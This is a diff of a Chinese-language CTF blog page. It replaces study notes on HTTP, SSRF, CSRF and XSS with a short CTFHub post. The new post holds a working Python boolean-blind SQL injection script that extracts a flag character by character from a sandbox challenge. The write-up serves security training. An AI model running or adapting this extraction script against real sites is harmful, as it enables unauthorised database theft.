@@ -6,22 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://ocgittt.github.io">
-  <title>xman2019web | OC的博客</title>
+  <title>ctfhub | OC的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="xman2019web知识点">
-<meta name="keywords" content="CTF">
+  <meta name="description" content="平台地址:https://www.ctfhub.com/">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xman2019web">
-<meta property="og:url" content="https://ocgittt.github.io/2020/11/19/xman2019web/index.html">
+<meta property="og:title" content="ctfhub">
+<meta property="og:url" content="https://ocgittt.github.io/2020/11/29/ctfhub/index.html">
 <meta property="og:site_name" content="OC的博客">
-<meta property="og:description" content="xman2019web知识点">
+<meta property="og:description" content="平台地址:https://www.ctfhub.com/">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://ocgittt.github.io/2020/11/19/xman2019web/ssrfintro.png">
-<meta property="og:updated_time" content="2020-11-29T07:30:23.417Z">
+<meta property="og:updated_time" content="2020-11-29T08:21:45.107Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xman2019web">
-<meta name="twitter:description" content="xman2019web知识点">
-<meta name="twitter:image" content="https://ocgittt.github.io/2020/11/19/xman2019web/ssrfintro.png">
+<meta name="twitter:title" content="ctfhub">
+<meta name="twitter:description" content="平台地址:https://www.ctfhub.com/">
   
     <link rel="alternative" href="/atom.xml" title="OC的博客" type="application/atom+xml">
   
@@ -143,147 +140,31 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-xman2019web" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-ctfhub" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      xman2019web
+      ctfhub
     </h1>
   
 
         
-        <a href="/2020/11/19/xman2019web/" class="archive-article-date">
-  	<time datetime="2020-11-19T00:33:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-19</time>
+        <a href="/2020/11/29/ctfhub/" class="archive-article-date">
+  	<time datetime="2020-11-29T07:28:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>xman2019web知识点</p>
+        <p>平台地址:<a href="https://www.ctfhub.com/" target="_blank" rel="noopener">https://www.ctfhub.com/</a></p>
 <a id="more"></a>
 
-<h1 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP/HTTPS"></a>HTTP/HTTPS</h1><p>HTTP+SSL/TLS = HTTPS</p>
-<p>HTTP是TCP/IP模型中的应用层协议</p>
-<p>HTTP是一个无状态协议</p>
-<p>HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</p>
-<p>HTTP 0.9和1.0使用非持续连接：限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接。HTTP 1.1使用持续连接：不必为每个web对象创建一个新的连接，一个连接可以传送多个对象，采用这种方式可以节省传输时间。</p>
-<p>无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p>
-<p>支持B(browser)/S及C/S模式。</p>
-<h2 id="web应用如何处理用户请求"><a href="#web应用如何处理用户请求" class="headerlink" title="web应用如何处理用户请求"></a>web应用如何处理用户请求</h2><ol>
-<li>客户机与服务器需要建立连接；</li>
-<li>建立连接后，客户机发送一个请求给服务器 (请求方式的格式为：统一资源标识符（URI）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容)</li>
-<li>服务器接到请求后，给予相应的响应信息 (格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容)</li>
-<li>客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接；</li>
-<li>如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端</li>
-</ol>
-<h2 id="HTTP响应状态码"><a href="#HTTP响应状态码" class="headerlink" title="HTTP响应状态码"></a>HTTP响应状态码</h2><p>状态代码由三位数字组成，第一个数字定义了响应的类别，共分五种类别:</p>
-<ul>
-<li>1xx：指示信息
-表示请求已接收，继续处理</li>
-<li>2xx：成功
-表示请求已被成功接收、理解、接受</li>
-<li>3xx：重定向
-要完成请求必须进行更进一步的操作</li>
-<li>4xx：客户端错误
-请求有语法错误或请求无法实现</li>
-<li>5xx：服务器端错误
-服务器未能实现合法的请求</li>
-</ul>
-<h2 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h2><ul>
-<li>200 OK
-客户端请求成功</li>
-<li>400 Bad Request
-客户端请求有语法错误，不能被服务器理解</li>
-<li>401 Unauthorized
-请求未经授权，该状态码和WWW-Authenticate报头域一起使用</li>
-<li>403 Forbidden
-服务器收到请求，但拒绝提供服务</li>
-<li>404 Not Found
-请求资源不存在</li>
-</ul>
-<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)</p>
-<p>是一种由攻击者构造形成  由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的<strong>内部系统</strong>。</p>
-<h2 id="SSRF形成的原因"><a href="#SSRF形成的原因" class="headerlink" title="SSRF形成的原因:"></a>SSRF形成的原因:</h2><blockquote>
-<p>大都是由于服务端提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。
-比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
-</blockquote>
-<img src="/2020/11/19/xman2019web/ssrfintro.png">
-
-<h2 id="php中可能存在ssrf漏洞的函数"><a href="#php中可能存在ssrf漏洞的函数" class="headerlink" title="php中可能存在ssrf漏洞的函数:"></a>php中可能存在ssrf漏洞的函数:</h2><blockquote>
-<p>file_get_contents()
-fsockopen()
-curl_exec()</p>
-</blockquote>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h2><ol>
-<li>对外网服务器所在内网、本地进行端口扫描，获取Banner信息</li>
-<li>测试运行在内网或本地的应用程序</li>
-<li>利用file协议读取文件</li>
-</ol>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御:"></a>防御:</h2><ol>
-<li>限制协议为 HTTP、HTTPS，需求不需要，就不要开类似gopher，file，ftp协议</li>
-<li>禁止 30x 跳转</li>
-<li>设置 URL 白名单或者限制内网 IP</li>
-<li>服务端需要鉴权（Cookies &amp; User：Pass）不能完美利用</li>
-</ol>
-<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF（Cross-site request forery，跨站请求伪造）也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF。</p>
-<h2 id="CSRF与XSS区别："><a href="#CSRF与XSS区别：" class="headerlink" title="CSRF与XSS区别："></a>CSRF与XSS区别：</h2><ol>
-<li>XSS利用站内的信任用户，盗取Cookie；（可以理解为欺骗客户端）</li>
-<li>CSRF通过伪装成受信任用户请求受信任的网站。（可以理解为欺骗服务端）</li>
-</ol>
-<h2 id="CSRF特点"><a href="#CSRF特点" class="headerlink" title="CSRF特点"></a>CSRF特点</h2><ul>
-<li><p>一般需要结合社工，在身份认证会话过程中实现攻击</p>
-<blockquote>
-<p>修改账号密码、个人信息（email、收货地址）
-发送伪造的业务请求（网银、购物、投票）
-关注他人社交账号、推送博文
-在用户非自愿、不知情的情况下提交请求</p>
-</blockquote>
-</li>
-<li><p>属于业务逻辑漏洞，对关键操作缺少确认机制</p>
-</li>
-</ul>
-<h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><ul>
-<li>被害用户已经完成身份认证</li>
-<li>新请求的提交不需要重新身份认证或确认机制</li>
-<li>攻击者必须了解web应用请求参数构造</li>
-<li>诱使用户触发攻击的指令（社工）</li>
-</ul>
-<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用:"></a>利用:</h2><ul>
-<li>GET型无验证CSRF</li>
-<li>构造恶意链接诱使用户点击</li>
-<li>没有第二次验证身份，直接执行操作</li>
-<li>POST型CSRF</li>
-<li>自动化探测工具(CSRFTester)</li>
-<li>XSS+CSRF组合拳</li>
-</ul>
-<h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御:"></a>防御:</h2><ul>
-<li>Referer防御CSRF</li>
-<li>token防御CSRF</li>
-</ul>
-<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>被动攻击</p>
-<p>跨站脚本(Cross-Site Scripting,XSS)是一种经常出现在 Web 应用程序中的计算机安全漏洞，是由于 Web 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码（通常包括 HTML 代码和客户端 JavaScript 脚本）注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码。攻击者可以对受害用户采取 Cookie 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
-<h2 id="XSS的特点"><a href="#XSS的特点" class="headerlink" title="XSS的特点"></a>XSS的特点</h2><ul>
-<li>XSS最大的特点就是能注入恶意的HTML/Javascript代码到用户浏览的网页上，从而达到劫持用户会话的目的。由于HTML代码和客户端Javascript脚本能在受害者主机上的浏览器任意执行，这样等同于完全控制了web客户端的逻辑，在这个基础上，黑客或攻击者可以轻易的发动各种各样的攻击。</li>
-<li>XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助于网站进行传播，使网站的大量用户收到攻击。</li>
-</ul>
-<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><ul>
-<li><p>反射型XSS: 
-发出请求时，XSS代码出现在URL中，作为输入提交到服务端，服务端解析后响应，在响应内容中出现这段XSS代码，最后浏览器解析执行。这个过程就像一次反射，故称为反射型XSS。</p>
-</li>
-<li><p>存储型XSS(持久性XSS): 
-提交的XSS代码会存储在服务器端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。</p>
-</li>
-<li><p>DOM型(Document Object Model): 
-DOM是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。
-攻击者提交的恶意数据并未显式的包含在web服务器的响应页面中，但会被页面中的js脚本以变量的形式来访问到，导致浏览器在渲染页面执行js脚本的过程中，通过DOM操作执行变量所代表的恶意脚本。</p>
-</li>
-</ul>
-<p><a href="https://www.jianshu.com/p/190dedd585f2" target="_blank" rel="noopener">https://www.jianshu.com/p/190dedd585f2</a></p>
-
+<h1 id="web技能树"><a href="#web技能树" class="headerlink" title="web技能树"></a>web技能树</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://challenge-604032b6474df63d.sandbox.ctfhub.com:10080/?id="</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_!@#$%^&amp;*()"</span>:</span><br><span class="line">        payload = <span class="string">"1 and if(substr((select flag from flag),%d,1)='%s',1,(select table_name from information_schema.tables))"</span> %(i,j)</span><br><span class="line">        <span class="comment"># 1 and if(substr((select flag from flag),1,1)='c',1,(select table_name from information_schema.tables))</span></span><br><span class="line"></span><br><span class="line">        url1 = url+payload</span><br><span class="line">        res = s.get(url1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"query_success"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(j,end=<span class="string">''</span>)</span><br><span class="line">            name += j</span><br><span class="line">            time.sleep(<span class="number">1</span>)<span class="comment">#不间断跑可能会断开</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">print(name)</span><br></pre></td></tr></table></figure>
       
 
       
@@ -291,17 +172,6 @@ DOM是一个平台和语言都中立的接口，可以使程序和脚本能够�
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -352,7 +222,7 @@ DOM是一个平台和语言都中立的接口，可以使程序和脚本能够�
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://ocgittt.github.io/2020/11/19/xman2019web/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://ocgittt.github.io/2020/11/29/ctfhub/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -366,18 +236,9 @@ DOM是一个平台和语言都中立的接口，可以使程序和脚本能够�
   
 <nav id="article-nav">
   
-    <a href="/2020/11/24/bugku-new/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          bugku_new
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/10/21/gwctf2019/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">gwctf2019</div>
+    <a href="/2020/11/24/bugku-new/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">bugku_new</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -404,7 +265,7 @@ DOM是一个平台和语言都中立的接口，可以使程序和脚本能够�
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-HTTPS"><span class="toc-number">1.</span> <span class="toc-text">HTTP/HTTPS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web应用如何处理用户请求"><span class="toc-number">1.1.</span> <span class="toc-text">web应用如何处理用户请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP响应状态码"><span class="toc-number">1.2.</span> <span class="toc-text">HTTP响应状态码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见状态码"><span class="toc-number">1.3.</span> <span class="toc-text">常见状态码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">2.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF形成的原因"><span class="toc-number">2.1.</span> <span class="toc-text">SSRF形成的原因:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php中可能存在ssrf漏洞的函数"><span class="toc-number">2.2.</span> <span class="toc-text">php中可能存在ssrf漏洞的函数:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">2.3.</span> <span class="toc-text">利用:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御"><span class="toc-number">2.4.</span> <span class="toc-text">防御:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF与XSS区别："><span class="toc-number">3.1.</span> <span class="toc-text">CSRF与XSS区别：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF特点"><span class="toc-number">3.2.</span> <span class="toc-text">CSRF特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用条件"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用-1"><span class="toc-number">3.4.</span> <span class="toc-text">利用:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-1"><span class="toc-number">3.5.</span> <span class="toc-text">防御:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS的特点"><span class="toc-number">4.1.</span> <span class="toc-text">XSS的特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS分类"><span class="toc-number">4.2.</span> <span class="toc-text">XSS分类</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web技能树"><span class="toc-number">1.</span> <span class="toc-text">web技能树</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注"><span class="toc-number">1.1.1.</span> <span class="toc-text">布尔盲注</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
